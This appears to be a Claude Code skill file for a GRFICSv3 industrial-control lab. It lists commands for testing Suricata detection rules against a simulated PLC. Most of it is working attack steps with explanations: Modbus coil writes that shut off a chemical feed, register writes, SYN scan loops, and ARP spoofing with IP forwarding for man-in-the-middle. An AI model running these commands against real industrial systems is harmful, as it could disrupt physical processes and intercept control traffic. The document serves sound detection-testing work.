---
name: attack-testing
description: Run adversary test commands against the GRFICSv3 PLC to trigger and verify Suricata detections. Trigger when the user wants to launch an attack, test a specific rule or SID, send a coil or register write, run recon or a port scan, set up an ARP spoof or MITM, or restore process state after an attack. Each command notes which detection SID it exercises.
---

# GRFICSv3 Attack Testing

> **Privilege note for Claude Code:** commands marked **[USER RUNS]** require sudo and must be run by Nathaniel in his own terminal. Claude Code cannot run sudo. Commands marked **[CLAUDE OK]** need no root. When a sudo step is reached, hand it to Nathaniel and wait, do not attempt it. Beyond the sudo boundary, Claude Code should never launch the arpspoof or nmap commands autonomously even if a way around sudo exists, these are offensive tools and stay under Nathaniel's direct control.

Commands for exercising the detection layer. All target the PLC at `192.168.95.2` on Modbus port `502` (or `8080` for the OpenPLC web interface). These are run from the Kali attacker (`192.168.90.6`), which is never an authorized source, so every one of these should trip a rule when Suricata is live.

Before running any of these, confirm the lab is up (simulation containers healthy, Suricata running on `eno1`). If detections are the goal, also confirm the pipeline is running to see enriched output.

## Coil write attack (triggers SID 1000001) [CLAUDE OK]

Disables the Chemical A feed by writing coil 40 to off:

```bash
python3 -c "from pymodbus.client import ModbusTcpClient; c=ModbusTcpClient('192.168.95.2',port=502); c.connect(); c.write_coil(40,False); c.close()"
```

- `python3 -c "..."` runs the inline Python directly, no script file.
- `ModbusTcpClient('192.168.95.2',port=502)` points the client at the PLC on the Modbus port.
- `c.connect()` opens the TCP connection.
- `c.write_coil(40,False)` is FC5 Write Single Coil: sets coil 40 (Chemical A enable) to off. This is the write that trips the rule.
- `c.close()` closes cleanly.

This one needs no root (it is just a TCP client), so Claude Code can run it if asked to test the coil rule. Still, prefer letting Nathaniel drive attack runs unless he explicitly asks Claude Code to fire one.

## Register write attack (triggers SID 1000002) [CLAUDE OK]

Writes to holding register 102 (purge valve position mirror):

```bash
python3 -c "from pymodbus.client import ModbusTcpClient; c=ModbusTcpClient('192.168.95.2',port=502); c.connect(); c.write_register(102,1); c.close()"
```

- `c.write_register(102,1)` is FC6 Write Single Register: writes the value 1 to register 102. Note that register 102 is a Modbus-exposed mirror, not the physical actuator, so this does not move the valve, but the write still hits the PLC and trips the rule.

## Recon / port scan (triggers SID 1000006) [CLAUDE OK]

Rule 1000006 is a threshold rule (`threshold:type both,track by_src,count 10,seconds 10` in `local.rules`): it needs **10 SYN packets to port 502 within 10 seconds** from one source, not just any scan. A single default `nmap -sS -p 502 <target>` against a responsive port only sends one SYN (maybe two with a retry), nowhere near the threshold, and silently does not trip the rule, confirmed by testing it directly.

`flags:S` matches any SYN-only packet, not specifically a raw SYN scan, so a plain TCP `connect()` loop trips it just as well and needs no root:

```bash
python3 -c "
import socket
for i in range(12):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(0.5)
    try:
        s.connect(('192.168.95.2', 502))
    except Exception:
        pass
    finally:
        s.close()
"
```

- `socket.socket(...)` and `s.connect(...)` open a normal TCP connection; the SYN is the first packet of that handshake regardless of whether the connection completes.
- `settimeout(0.5)` keeps a non-responsive attempt from hanging the loop.
- 12 iterations in a tight loop reliably clears the 10-in-10-seconds threshold. This needs no root, so Claude Code can run it directly.

If a true half-open SYN scan is specifically wanted instead: [USER RUNS]

```bash
for i in 1 2 3; do sudo nmap -sS -p 502 192.168.95.2; sleep 1; done
```

- `sudo` because a SYN scan needs raw socket privileges.
- Repeating the scan a few times accumulates enough SYNs within the 10-second window. A single un-repeated `nmap -sS -p 502` run, as this section previously recommended, does not reliably trip the rule against a responsive host.

## ARP spoof / MITM setup (no detection rule) [USER RUNS]

There is currently no working ARP detection rule (SID 1000005 was abandoned because Suricata 7.0.3 does not support `alert arp`). These are for setting up MITM position to test the downstream Modbus rules that catch the falsified traffic.

Poison the HMI so it routes PLC traffic through Kali:

```bash
sudo arpspoof -i eth0 -t 192.168.90.107 192.168.90.200
```

- `sudo` because forging ARP replies needs root.
- `-i eth0` the Kali interface on the supervisory network.
- `-t 192.168.90.107` the target being poisoned: the HMI.
- `192.168.90.200` the host being impersonated to the HMI: the router. The HMI now believes the router lives at Kali's MAC.

For bidirectional capture, run a second spoof in another terminal poisoning the router:

```bash
sudo arpspoof -i eth0 -t 192.168.90.200 192.168.90.107
```

Enable forwarding so Kali behaves like a router while spoofing:

```bash
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
```

- `echo 1` outputs the character 1.
- `|` pipes it into the next command.
- `sudo tee /proc/sys/net/ipv4/ip_forward` writes it to the kernel's IPv4 forwarding toggle. `tee` is used instead of a plain redirect because the redirect target needs root, and `tee` runs under `sudo` while `>` would not.

## Restoring state

After a coil attack, flip Chemical A back on: [CLAUDE OK]

```bash
python3 -c "from pymodbus.client import ModbusTcpClient; c=ModbusTcpClient('192.168.95.2',port=502); c.connect(); c.write_coil(40,True); c.close()"
```

After ARP spoofing, stop the spoof and disable forwarding: [USER RUNS]

```bash
sudo pkill arpspoof && echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward
```

- `pkill arpspoof` kills all running arpspoof processes by name.
- `echo 0 | sudo tee ...` sets forwarding back to off, returning Kali to a normal endpoint.

## Verifying a detection fired [USER RUNS]

With Suricata live, watch the human-readable log:

```bash
sudo tail -f /var/log/suricata/fast.log
```

Each alert prints a line naming the SID, the message, and the source and destination. If the pipeline is running, the enriched analysis appears on the dashboard within about 3 seconds.
